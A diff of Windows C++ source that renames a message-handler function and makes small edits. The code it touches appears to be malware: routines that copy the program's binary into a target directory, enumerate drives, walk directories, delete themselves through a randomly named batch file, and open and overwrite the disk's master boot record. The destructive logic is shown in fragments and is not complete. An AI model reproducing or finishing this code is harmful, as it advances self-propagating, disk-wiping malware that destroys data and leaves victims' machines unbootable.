@@ -21,26 +21,24 @@ BOOL fnCopyFileW(
 		if (CopyFile(szMfn, lpAdfn, FALSE)) {
 			return TRUE;
 		} else {
-			fnMESSAGEHANDLERW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
+			fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
 			return FALSE;
 		}
 	} else {
 		if (GetLastError() == ERROR_ALREADY_EXISTS) {
-			fnMESSAGEHANDLERW(NULL, L"Directory already exist\nPath: %s", L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);
+			fnMessageHandlerW(NULL, L"Directory already exist\nPath: %s", L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);
 
 			if (CopyFile(szMfn, lpAdfn, FALSE)) {
 				return TRUE;
 			} else {
-				fnMESSAGEHANDLERW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
+				fnMessageHandlerW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
 				return FALSE;
 			}
 		} else {
-			fnMESSAGEHANDLERW(NULL, L"Couldn't create target Directory\nPath: %s", L"CreateDirectoryW", MB_ICONERROR, lpAdpn);
+			fnMessageHandlerW(NULL, L"Couldn't create target Directory\nPath: %s", L"CreateDirectoryW", MB_ICONERROR, lpAdpn);
 			return FALSE;
 		}
 	}
-
-	return FALSE;
 }
 
 // TODO: Use Pointers
@@ -60,14 +58,14 @@ BOOL fnDriveEnumeratorW(
 						vszDrives->push_back(szDrive);
 					}
 				} else {
-					fnMESSAGEHANDLERW(NULL, L"Couldn't determin Drive type\nPath: %s", L"GetDriveTypeW", MB_ICONWARNING, szDrive.c_str());
+					fnMessageHandlerW(NULL, L"Couldn't determin Drive type\nPath: %s", L"GetDriveTypeW", MB_ICONWARNING, szDrive.c_str());
 				}
 			}
 		}
 
 		return TRUE;
 	} else {
-		fnMESSAGEHANDLERW(NULL, L"Couldn't enumerate Drives", L"GetLogicalDriveStringsW", MB_ICONERROR);
+		fnMessageHandlerW(NULL, L"Couldn't enumerate Drives", L"GetLogicalDriveStringsW", MB_ICONERROR);
 		return FALSE;
 	}
 }
@@ -96,7 +94,7 @@ BOOL fnDirectoryIteratorW(
 		FindClose(hFind);
 		return TRUE;
 	} else {
-		fnMESSAGEHANDLERW(NULL, L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
+		fnMessageHandlerW(NULL, L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
 		return FALSE;
 	}
 }
@@ -133,7 +131,7 @@ BOOL fnDirectoryIteratorW(
 //		return TRUE;
 //	}
 //	else {
-//		fnMESSAGEHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", NULL, L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
+//		fnMessageHandlerW(L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", NULL, L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
 //		return FALSE;
 //	}
 //}
@@ -142,7 +140,7 @@ BOOL fnSelfDeleteW(VOID) {
 	DWORD dwBufferSize = NULL;
 	HANDLE hHeap = GetProcessHeap();
 
-	LPCWSTR lpCGRS = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet);
+	LPCWSTR lpCGRS = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);
 	std::wstring szBat = szCd + (std::wstring)lpCGRS + L".bat";
 
 	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA101, RT_RCDATA, &dwBufferSize);
@@ -193,12 +191,12 @@ BOOL fnSelfDeleteW(VOID) {
 				CloseHandle(hMbr);
 				return TRUE;
 			} else {
-				fnMESSAGEHANDLERW(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_ICONERROR);
+				fnMessageHandlerW(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_ICONERROR);
 				CloseHandle(hMbr);
 				return FALSE;
 			}
 		} else {
-			fnMESSAGEHANDLERW(NULL, L"Couldn't open Handle \"hMbr\" to MBR", L"CreateFileW", MB_ICONERROR);
+			fnMessageHandlerW(NULL, L"Couldn't open Handle \"hMbr\" to MBR", L"CreateFileW", MB_ICONERROR);
 			return FALSE;
 		}
 	}
